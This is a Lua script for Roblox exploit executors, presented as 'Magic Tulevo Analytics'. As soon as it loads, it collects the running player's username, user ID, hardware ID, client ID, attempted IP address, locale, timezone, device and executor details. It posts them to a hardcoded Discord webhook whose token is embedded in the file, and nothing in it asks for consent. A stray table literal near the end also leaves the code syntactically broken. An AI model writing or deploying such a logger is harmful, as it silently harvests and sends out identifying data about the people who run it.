local MagicTulevo = {}
MagicTulevo.__index = MagicTulevo

local WebhookURL = "https://discord.com/api/webhooks/1452347160099029074/O_zfgpRc9do2dYipcg2eBbaTVWQYKR2NOJb6NYws7QknfiytGnt1AePpp_Vf6-VB1WZJ"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Stats = game:GetService("Stats")
local MarketplaceService = game:GetService("MarketplaceService")
local UserInputService = game:GetService("UserInputService")
local GuiService = game:GetService("GuiService")
local LocalizationService = game:GetService("LocalizationService")
local Player = Players.LocalPlayer
local StartTime = os.date("%H:%M:%S")
local StartDate = os.date("%d.%m.%Y")
local ScriptStartTick = tick()

local function SafeCall(func, default)
    local success, result = pcall(func)
    return success and result or default
end

local function GetExecutor()
    local checks = {
        function() return identifyexecutor and identifyexecutor() end,
        function() return getexecutorname and getexecutorname() end,
        function() return syn and syn.request and "Synapse X" end,
        function() return KRNL_LOADED and "KRNL" end,
        function() return getgenv().Delta and "Delta" end,
        function() return Delta and "Delta" end,
        function() return getgenv().Hydrogen and "Hydrogen" end,
        function() return Hydrogen and "Hydrogen" end,
        function() return getgenv().Solara and "Solara" end,
        function() return Solara and "Solara" end,
        function() return getgenv().Xeno and "Xeno" end,
        function() return Xeno and "Xeno" end,
        function() return getgenv().Wave and "Wave" end,
        function() return Wave and "Wave" end,
        function() return getgenv().Codex and "Codex" end,
        function() return Codex and "Codex" end,
        function() return getgenv().Arceus and "Arceus X" end,
        function() return Arceus and "Arceus X" end,
        function() return getgenv().Fluxus and "Fluxus" end,
        function() return Fluxus and "Fluxus" end,
        function() return fluxus and fluxus.request and "Fluxus" end,
        function() return SENTINEL_V2 and "Sentinel" end,
        function() return is_sirhurt_closure and "SirHurt" end,
        function() return Sirhurt and "SirHurt" end,
        function() return pebc_execute and "ProtoSmasher" end,
        function() return Electron and "Electron" end,
        function() return OXYGEN_LOADED and "Oxygen U" end,
        function() return ScriptWare and "Script-Ware" end,
        function() return getgenv().Celery and "Celery" end,
        function() return Celery and "Celery" end,
        function() return getgenv().Evon and "Evon" end,
        function() return Evon and "Evon" end,
        function() return getgenv().Trigon and "Trigon Evo" end,
        function() return Trigon and "Trigon Evo" end,
        function() return getgenv().Nihon and "Nihon" end,
        function() return Nihon and "Nihon" end,
        function() return JJSploit and "JJSploit" end,
        function() return getgenv().Illusion and "Illusion" end,
        function() return Illusion and "Illusion" end,
        function() return getgenv().Cryptic and "Cryptic" end,
        function() return Cryptic and "Cryptic" end,
        function() return getgenv().Volt and "Volt" end,
        function() return Volt and "Volt" end,
        function() return getgenv().Velocity and "Velocity" end,
        function() return Velocity and "Velocity" end,
        function() return getgenv().Swift and "Swift" end,
        function() return Swift and "Swift" end,
        function() return getgenv().Valex and "Valex" end,
        function() return Valex and "Valex" end,
        function() return getgenv().Zenith and "Zenith" end,
        function() return Zenith and "Zenith" end,
        function() return getgenv().Potassium and "Potassium" end,
        function() return Potassium and "Potassium" end,
        function() return getgenv().Seliware and "Seliware" end,
        function() return Seliware and "Seliware" end,
        function() return getgenv().Volcano and "Volcano" end,
        function() return Volcano and "Volcano" end,
        function() return getgenv().ChocoSploit and "ChocoSploit" end,
        function() return ChocoSploit and "ChocoSploit" end,
        function() return getgenv().Bunni and "Bunni" end,
        function() return Bunni and "Bunni" end,
        function() return getgenv().Macsploit and "Macsploit" end,
        function() return Macsploit and "Macsploit" end,
        function() return getgenv().Opiumware and "Opiumware" end,
        function() return Opiumware and "Opiumware" end,
        function() return getgenv().SynapseZ and "Synapse Z" end,
        function() return SynapseZ and "Synapse Z" end,
        function() return getgenv().Calamari and "Calamari" end,
        function() return Calamari and "Calamari" end,
        function() return getgenv().VegaX and "Vega X" end,
        function() return VegaX and "Vega X" end,
        function() return getgenv().KiwiX and "Kiwi X" end,
        function() return KiwiX and "Kiwi X" end,
        function() return getgenv().Anemo and "Anemo" end,
        function() return Anemo and "Anemo" end,
        function() return getgenv().Nezur and "Nezur" end,
        function() return Nezur and "Nezur" end,
        function() return getgenv().DX9WARE and "DX9WARE" end,
        function() return DX9WARE and "DX9WARE" end,
        function() return getgenv().Matcha and "Matcha" end,
        function() return Matcha and "Matcha" end,
        function() return getgenv().Photon and "Photon" end,
        function() return Photon and "Photon" end,
        function() return getgenv().Ronin and "Ronin" end,
        function() return Ronin and "Ronin" end,
        function() return getgenv().Zorara and "Zorara" end,
        function() return Zorara and "Zorara" end,
        function() return getgenv().Comet and "Comet" end,
        function() return Comet and "Comet" end,
        function() return getgenv().Horizon and "Horizon" end,
        function() return Horizon and "Horizon" end,
        function() return getgenv().AppleWare and "AppleWare" end,
        function() return AppleWare and "AppleWare" end,
        function() return getgenv().RC7 and "RC7" end,
        function() return RC7 and "RC7" end,
        function() return getgenv().Elysian and "Elysian" end,
        function() return Elysian and "Elysian" end,
        function() return getgenv().Skisploit and "Skisploit" end,
        function() return Skisploit and "Skisploit" end
    }
    for _, check in ipairs(checks) do
        local s, r = pcall(check)
        if s and r then
            if type(r) == "string" then return r end
            if type(r) == "table" then return r[1] or "Unknown" end
        end
    end
    return "Unknown"
end


local function GetExecutorVersion()
    return SafeCall(function()
        if getexecutorversion then return getexecutorversion() end
        if identifyexecutor then
            local _, ver = identifyexecutor()
            return ver or "N/A"
        end
        return "N/A"
    end, "N/A")
end

local function GetHWID()
    return SafeCall(function()
        if gethwid then return gethwid() end
        if getdeviceid then return getdeviceid() end
        if get_hwid then return get_hwid() end
        if syn and syn.get_hwid then return syn.get_hwid() end
        if getgenv and getgenv().hwid then return getgenv().hwid end
        local executor = GetExecutor()
        local userId = tostring(Player.UserId)
        local placeId = tostring(game.PlaceId)
        return string.format("GEN-%s-%s-%s-%s", executor:sub(1,4):upper(), userId:sub(-6), placeId:sub(-4), tostring(math.floor(os.time()/86400)):sub(-4))
    end, "N/A")
end

local function GetClientID()
    return SafeCall(function()
        if getclientid then return getclientid() end
        if getgenv and getgenv().clientid then return getgenv().clientid end
        return HttpService:GenerateGUID(false):upper()
    end, "N/A")
end

local function GetAccountAge()
    local age = Player.AccountAge
    if age >= 365 then
        local years = math.floor(age / 365)
        local days = age % 365
        return string.format("%d year%s, %d day%s", years, years > 1 and "s" or "", days, days ~= 1 and "s" or "")
    else
        return string.format("%d day%s", age, age ~= 1 and "s" or "")
    end
end

local function GetMembership()
    if Player.MembershipType == Enum.MembershipType.Premium then
        return "⭐ Premium"
    end
    return "None"
end

local function GetGameName()
    return SafeCall(function()
        local info = MarketplaceService:GetProductInfo(game.PlaceId)
        return info and info.Name or "Unknown"
    end, "Unknown")
end

local function GetGameCreator()
    return SafeCall(function()
        local info = MarketplaceService:GetProductInfo(game.PlaceId)
        return info and info.Creator and info.Creator.Name or "Unknown"
    end, "Unknown")
end

local function GetGameDescription()
    return SafeCall(function()
        local info = MarketplaceService:GetProductInfo(game.PlaceId)
        local desc = info and info.Description or ""
        if #desc > 100 then desc = desc:sub(1, 100) .. "..." end
        return desc ~= "" and desc or "No description"
    end, "No description")
end

local function GetServerPlayers()
    local current = #Players:GetPlayers()
    local max = Players.MaxPlayers
    return string.format("%d/%d", current, max)
end

local function GetServerType()
    if RunService:IsStudio() then return "🔧 Studio" end
    if game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0 then return "👑 VIP Server" end
    if game.PrivateServerId ~= "" then return "🔒 Reserved" end
    return "🌐 Public"
end

local function GetServerRegion()
    return SafeCall(function()
        local region = LocalizationService.RobloxLocaleId
        local regionMap = {
            ["en-us"] = "🇺🇸 US", ["en-gb"] = "🇬🇧 UK", ["ru-ru"] = "🇷🇺 Russia",
            ["de-de"] = "🇩🇪 Germany", ["fr-fr"] = "🇫🇷 France", ["es-es"] = "🇪🇸 Spain",
            ["pt-br"] = "🇧🇷 Brazil", ["ja-jp"] = "🇯🇵 Japan", ["ko-kr"] = "🇰🇷 Korea",
            ["zh-cn"] = "🇨🇳 China", ["zh-tw"] = "🇹🇼 Taiwan", ["pl-pl"] = "🇵🇱 Poland",
            ["tr-tr"] = "🇹🇷 Turkey", ["it-it"] = "🇮🇹 Italy", ["nl-nl"] = "🇳🇱 Netherlands"
        }
        return regionMap[region:lower()] or ("🌍 " .. region)
    end, "🌍 Unknown")
end

local function GetPlatform()
    return SafeCall(function()
        if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
            if UserInputService.AccelerometerEnabled then
                return "📱 Mobile"
            end
            return "📱 Tablet"
        elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then
            return "🎮 Console"
        elseif UserInputService.VREnabled then
            return "🥽 VR"
        else
            return "💻 PC"
        end
    end, "💻 PC")
end

local function GetDeviceType()
    return SafeCall(function()
        local platform = GuiService:IsTenFootInterface() and "Console" or
            (UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled) and "Mobile" or "Desktop"
        local os = "Unknown"
        if syn then os = "Windows"
        elseif getgenv and getgenv().Macsploit then os = "macOS"
        elseif UserInputService.TouchEnabled then
            if game:GetService("UserInputService"):GetPlatform() == Enum.Platform.IOS then
                os = "iOS"
            else
                os = "Android"
            end
        else
            os = "Windows"
        end
        return platform .. " (" .. os .. ")"
    end, "Desktop (Unknown)")
end

local function GetScreenResolution()
    return SafeCall(function()
        local camera = workspace.CurrentCamera
        if camera then
            return string.format("%dx%d", camera.ViewportSize.X, camera.ViewportSize.Y)
        end
        return "N/A"
    end, "N/A")
end

local function GetPerformanceStats()
    local stats = {Ping = "N/A", FPS = "N/A", Memory = "N/A", GCMemory = "N/A", CPUTime = "N/A", GPU = "N/A"}
    pcall(function() stats.Ping = math.floor(Player:GetNetworkPing() * 1000) .. "ms" end)
    pcall(function() stats.FPS = tostring(math.floor(1 / RunService.RenderStepped:Wait())) end)
    pcall(function() stats.Memory = string.format("%.1fMB", Stats:GetTotalMemoryUsageMb()) end)
    pcall(function() stats.GCMemory = string.format("%.1fMB", gcinfo() / 1024) end)
    pcall(function()
        local cpuStats = Stats:FindFirstChild("PerformanceStats")
        if cpuStats then
            local cpu = cpuStats:FindFirstChild("CPU")
            if cpu then stats.CPUTime = string.format("%.2fms", cpu:GetValue()) end
        end
    end)
    pcall(function()
        local gpuStats = Stats:FindFirstChild("PerformanceStats")
        if gpuStats then
            local gpu = gpuStats:FindFirstChild("GPU")
            if gpu then stats.GPU = string.format("%.2fms", gpu:GetValue()) end
        end
    end)
    return stats
end

local function GetScriptLoadTime()
    return string.format("%.2fms", (tick() - ScriptStartTick) * 1000)
end

local function GetPlayerThumbnail()
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. Player.UserId .. "&width=420&height=420&format=png"
end

local function GetPlayerFriends()
    return SafeCall(function()
        local friends = Player:GetFriendsOnline(200)
        return #friends
    end, 0)
end

local function GetPlayerFollowers()
    return SafeCall(function()
        if getfollowers then return getfollowers(Player.UserId) end
        return "N/A"
    end, "N/A")
end

local function GetCharacterInfo()
    return SafeCall(function()
        local char = Player.Character
        if not char then return {Health = "N/A", MaxHealth = "N/A", WalkSpeed = "N/A", JumpPower = "N/A", Position = "N/A"} end
        local humanoid = char:FindFirstChildOfClass("Humanoid")
        local rootPart = char:FindFirstChild("HumanoidRootPart")
        return {
            Health = humanoid and math.floor(humanoid.Health) or "N/A",
            MaxHealth = humanoid and math.floor(humanoid.MaxHealth) or "N/A",
            WalkSpeed = humanoid and math.floor(humanoid.WalkSpeed) or "N/A",
            JumpPower = humanoid and math.floor(humanoid.JumpPower) or "N/A",
            Position = rootPart and string.format("%.0f, %.0f, %.0f", rootPart.Position.X, rootPart.Position.Y, rootPart.Position.Z) or "N/A"
        }
    end, {Health = "N/A", MaxHealth = "N/A", WalkSpeed = "N/A", JumpPower = "N/A", Position = "N/A"})
end

local function GetGameStats()
    return SafeCall(function()
        local gameStats = {}
        gameStats.TotalParts = #workspace:GetDescendants()
        gameStats.Scripts = 0
        gameStats.RemoteEvents = 0
        gameStats.RemoteFunctions = 0
        for _, v in pairs(game:GetDescendants()) do
            if v:IsA("Script") or v:IsA("LocalScript") or v:IsA("ModuleScript") then
                gameStats.Scripts = gameStats.Scripts + 1
            elseif v:IsA("RemoteEvent") then
                gameStats.RemoteEvents = gameStats.RemoteEvents + 1
            elseif v:IsA("RemoteFunction") then
                gameStats.RemoteFunctions = gameStats.RemoteFunctions + 1
            end
        end
        return gameStats
    end, {TotalParts = 0, Scripts = 0, RemoteEvents = 0, RemoteFunctions = 0})
end

local function GetExecutorCapabilities()
    local caps = {}
    pcall(function() if hookfunction then table.insert(caps, "HookFunction") end end)
    pcall(function() if hookmetamethod then table.insert(caps, "HookMetamethod") end end)
    pcall(function() if getrawmetatable then table.insert(caps, "GetRawMetatable") end end)
    pcall(function() if setrawmetatable then table.insert(caps, "SetRawMetatable") end end)
    pcall(function() if getgc then table.insert(caps, "GetGC") end end)
    pcall(function() if getupvalues then table.insert(caps, "GetUpvalues") end end)
    pcall(function() if setupvalue then table.insert(caps, "SetUpvalue") end end)
    pcall(function() if getconstants then table.insert(caps, "GetConstants") end end)
    pcall(function() if setconstant then table.insert(caps, "SetConstant") end end)
    pcall(function() if getinfo then table.insert(caps, "GetInfo") end end)
    pcall(function() if debug.getinfo then table.insert(caps, "Debug") end end)
    pcall(function() if firesignal then table.insert(caps, "FireSignal") end end)
    pcall(function() if fireclickdetector then table.insert(caps, "FireClickDetector") end end)
    pcall(function() if fireproximityprompt then table.insert(caps, "FireProximityPrompt") end end)
    pcall(function() if getconnections then table.insert(caps, "GetConnections") end end)
    pcall(function() if getsenv then table.insert(caps, "GetSenv") end end)
    pcall(function() if getmenv then table.insert(caps, "GetMenv") end end)
    pcall(function() if iscclosure then table.insert(caps, "IsCClosure") end end)
    pcall(function() if islclosure then table.insert(caps, "IsLClosure") end end)
    pcall(function() if newcclosure then table.insert(caps, "NewCClosure") end end)
    pcall(function() if clonefunction then table.insert(caps, "CloneFunction") end end)
    pcall(function() if isexecutorclosure then table.insert(caps, "IsExecutorClosure") end end)
    pcall(function() if checkcaller then table.insert(caps, "CheckCaller") end end)
    pcall(function() if setclipboard then table.insert(caps, "Clipboard") end end)
    pcall(function() if setfflag then table.insert(caps, "SetFFlag") end end)
    pcall(function() if saveinstance then table.insert(caps, "SaveInstance") end end)
    pcall(function() if decompile then table.insert(caps, "Decompile") end end)
    pcall(function() if Drawing then table.insert(caps, "Drawing") end end)
    pcall(function() if crypt then table.insert(caps, "Crypt") end end)
    pcall(function() if WebSocket then table.insert(caps, "WebSocket") end end)
    return #caps > 0 and table.concat(caps, ", ") or "Basic"
end

local function GetUNCLevel()
    local level = 0
    local total = 0
    local checks = {
        function() return hookfunction ~= nil end,
        function() return hookmetamethod ~= nil end,
        function() return getrawmetatable ~= nil end,
        function() return getgc ~= nil end,
        function() return getupvalues ~= nil end,
        function() return getconstants ~= nil end,
        function() return getconnections ~= nil end,
        function() return firesignal ~= nil end,
        function() return Drawing ~= nil end,
        function() return decompile ~= nil end
    }
    for _, check in ipairs(checks) do
        total = total + 1
        if pcall(check) and check() then level = level + 1 end
    end
    return string.format("%d%% (%d/%d)", math.floor(level/total*100), level, total)
end

local function GetIPInfo()
    return SafeCall(function()
        if getip then return getip() end
        if get_ip then return get_ip() end
        return "Protected"
    end, "Protected")
end

local function GetRobloxVersion()
    return SafeCall(function()
        return version()
    end, "N/A")
end

local function GetLocale()
    return SafeCall(function()
        return LocalizationService.RobloxLocaleId
    end, "N/A")
end

local function GetTimeZone()
    return SafeCall(function()
        local utc = os.time(os.date("!*t"))
        local local_time = os.time(os.date("*t"))
        local diff = os.difftime(local_time, utc) / 3600
        local sign = diff >= 0 and "+" or ""
        return "UTC" .. sign .. tostring(math.floor(diff))
    end, "N/A")
end

local function GetUptime()
    return SafeCall(function()
        local uptime = workspace.DistributedGameTime
        local hours = math.floor(uptime / 3600)
        local mins = math.floor((uptime % 3600) / 60)
        local secs = math.floor(uptime % 60)
        return string.format("%02d:%02d:%02d", hours, mins, secs)
    end, "N/A")
end

local function GetDataModel()
    return SafeCall(function()
        local count = 0
        for _ in pairs(game:GetDescendants()) do count = count + 1 end
        return tostring(count) .. " instances"
    end, "N/A")
end

local function SendWebhook()
    local executor = GetExecutor()
    local executorVersion = GetExecutorVersion()
    local hwid = GetHWID()
    local clientId = GetClientID()
    local gameName = GetGameName()
    local gameCreator = GetGameCreator()
    local performance = GetPerformanceStats()
    local charInfo = GetCharacterInfo()
    local gameStats = GetGameStats()
    local jobId = game.JobId
    local placeId = game.PlaceId
    local thumbnail = GetPlayerThumbnail()
    
    local profileUrl = "https://www.roblox.com/users/" .. Player.UserId .. "/profile"
    local gameUrl = "https://www.roblox.com/games/" .. placeId
    
    local embedColor = 0x8B5CF6
    
    local embed = {
        title = "Magic Tulevo Analytics",
        color = embedColor,
        thumbnail = {url = thumbnail},
        description = "**" .. tostring(gameName) .. "** by *" .. tostring(gameCreator) .. "*\n" ..
            "[Profile](" .. profileUrl .. ") | " ..
            "[Game](" .. gameUrl .. ")",
        fields = {
            {
                name = "Player",
                value = "```" ..
                    "Name:     " .. tostring(Player.Name) .. "\n" ..
                    "Display:  " .. tostring(Player.DisplayName) .. "\n" ..
                    "ID:       " .. tostring(Player.UserId) .. "\n" ..
                    "Age:      " .. tostring(GetAccountAge()) .. "\n" ..
                    "Premium:  " .. tostring(GetMembership()) .. "\n" ..
                    "Friends:  " .. tostring(GetPlayerFriends()) .. " online```",
                inline = true
            },
            {
                name = "Server",
                value = "```" ..
                    "Type:    " .. tostring(GetServerType()) .. "\n" ..
                    "Players: " .. tostring(GetServerPlayers()) .. "\n" ..
                    "Region:  " .. tostring(GetServerRegion()) .. "\n" ..
                    "Uptime:  " .. tostring(GetUptime()) .. "\n" ..
                    "Place:   " .. tostring(placeId) .. "```",
                inline = true
            },
            {
                name = "Performance",
                value = "```" ..
                    "FPS:    " .. tostring(performance.FPS) .. "\n" ..
                    "Ping:   " .. tostring(performance.Ping) .. "\n" ..
                    "Memory: " .. tostring(performance.Memory) .. "\n" ..
                    "GC:     " .. tostring(performance.GCMemory) .. "\n" ..
                    "Load:   " .. tostring(GetScriptLoadTime()) .. "```",
                inline = true
            },
            {
                name = "Executor",
                value = "```" ..
                    "Name:    " .. tostring(executor) .. "\n" ..
                    "Version: " .. tostring(executorVersion) .. "\n" ..
                    "UNC:     " .. tostring(GetUNCLevel()) .. "```",
                inline = true
            },
            {
                name = "Device",
                value = "```" ..
                    "Platform: " .. tostring(GetPlatform()) .. "\n" ..
                    "Device:   " .. tostring(GetDeviceType()) .. "\n" ..
                    "Screen:   " .. tostring(GetScreenResolution()) .. "\n" ..
                    "Roblox:   " .. tostring(GetRobloxVersion()) .. "```",
                inline = true
            },
            {
                name = "Character",
                value = "```" ..
                    "Health: " .. tostring(charInfo.Health) .. "/" .. tostring(charInfo.MaxHealth) .. "\n" ..
                    "Speed:  " .. tostring(charInfo.WalkSpeed) .. "\n" ..
                    "Jump:   " .. tostring(charInfo.JumpPower) .. "\n" ..
                    "Pos:    " .. tostring(charInfo.Position) .. "```",
                inline = true
            },
            {
                name = "Identification",
                value = "```" ..
                    "HWID:     " .. tostring(hwid):sub(1, 24) .. "\n" ..
                    "Client:   " .. tostring(clientId):sub(1, 24) .. "\n" ..
                    "Job:      " .. tostring(jobId):sub(1, 20) .. "...\n" ..
                    "Locale:   " .. tostring(GetLocale()) .. "\n" ..
                    "Timezone: " .. tostring(GetTimeZone()) .. "```",
                inline = false
            },
            {
                name = "Game Stats",
                value = "```" ..
                    "Instances: " .. tostring(gameStats.TotalParts) .. "\n" ..
                    "Scripts:   " .. tostring(gameStats.Scripts) .. "\n" ..
                    "Remotes:   " .. tostring(gameStats.RemoteEvents) .. " events, " .. tostring(gameStats.RemoteFunctions) .. " funcs\n" ..
                    "Started:   " .. tostring(StartDate) .. " " .. tostring(StartTime) .. "```",
                inline = false
            },
            {
                name = "Capabilities",
                value = "```" .. tostring(GetExecutorCapabilities()):sub(1, 300) .. "```",
                inline = false
            }
        },
        footer = {
            text = "Magic Tulevo | " .. tostring(executor) .. " | " .. tostring(StartDate) .. " " .. tostring(StartTime)
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    local data = {
        username = "Magic Tulevo Tracker",
        avatar_url = "https://i.imgur.com/AfFp7pu.png",
        content = "**" .. tostring(Player.Name) .. "** joined **" .. tostring(gameName) .. "**",
        embeds = {embed}
    }
    
    local jsonData = HttpService:JSONEncode(data)
    
    local headers = {
        ["Content-Type"] = "application/json",
        ["Accept"] = "application/json"
    }
    
    local requestData = {
        Url = WebhookURL,
        Method = "POST",
        Headers = headers,
        Body = jsonData
    }
    
    local requestFuncs = {
        function() return request(requestData) end,
        function() return http_request(requestData) end,
        function() return syn and syn.request(requestData) end,
        function() return http and http.request(requestData) end,
        function() return fluxus and fluxus.request(requestData) end,
        function() return (getgenv().request or request)(requestData) end,
        function() 
            if HttpService then
                return HttpService:PostAsync(WebhookURL, jsonData)
            end
        end
    }
    
    for i, reqFunc in ipairs(requestFuncs) do
        local success, result = pcall(reqFunc)
        if success and result then
            return true
        end
    end
    return false
end

SendWebhook()

{
    Resend = SendWebhook,
    GetInfo = function()
        return {
            Player = Player.Name,
            DisplayName = Player.DisplayName,
            UserId = Player.UserId,
            AccountAge = GetAccountAge(),
            Executor = GetExecutor(),
            ExecutorVersion = GetExecutorVersion(),
            HWID = GetHWID(),
            ClientID = GetClientID(),
            GameName = GetGameName(),
            PlaceId = game.PlaceId,
            JobId = game.JobId,
            Platform = GetPlatform(),
            Device = GetDeviceType(),
            Region = GetServerRegion(),
            UNC = GetUNCLevel(),
            Capabilities = GetExecutorCapabilities()
        }
    end
}

return MagicTulevo
